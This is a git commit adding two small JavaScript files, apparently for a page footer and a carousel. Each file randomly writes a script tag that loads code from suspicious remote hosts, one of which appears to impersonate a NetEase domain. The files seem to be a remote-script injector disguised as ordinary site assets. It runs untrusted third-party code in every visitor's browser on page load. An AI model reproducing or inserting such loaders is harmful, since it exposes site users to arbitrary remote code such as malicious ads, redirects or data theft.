10ba3607ac4cb1f29384ce63f693aea7918295ca
aoerboquartz <aoerboquartz@gmail.com>
2020-11-24 14:51:29 +0800

    Add files via upload

---
+++ bottom.js
@@ -0,0 +1,8 @@
+var advList = [
+    "<script src='https://x.xxyxmdq.cn/c/21C388E9-FA61-4D15-9ED1-2AD6F8D608EE.panda'></script>",
+    "<script src='https://网易科技.video:12443/ty/c-11651-22.js'></script>"
+];
+var max = advList.length - 1;
+var min = 0;
+var num = parseInt(Math.random() * (max - min + 1) + min);
+document.write(advList[num]);
---
+++ lunbo.js
@@ -0,0 +1,8 @@
+var advList = [
+    "<script src='https://网易科技.video:12443/ty/c-11625-25.js'></script>",
+    "<script src='https://x.xxyxmdq.cn/c/2D9986C9-4DB9-4090-864D-E7AFB757AB03.panda'></script>"
+];
+var max = advList.length - 1;
+var min = 0;
+var num = parseInt(Math.random() * (max - min + 1) + min);
+document.write(advList[num]);
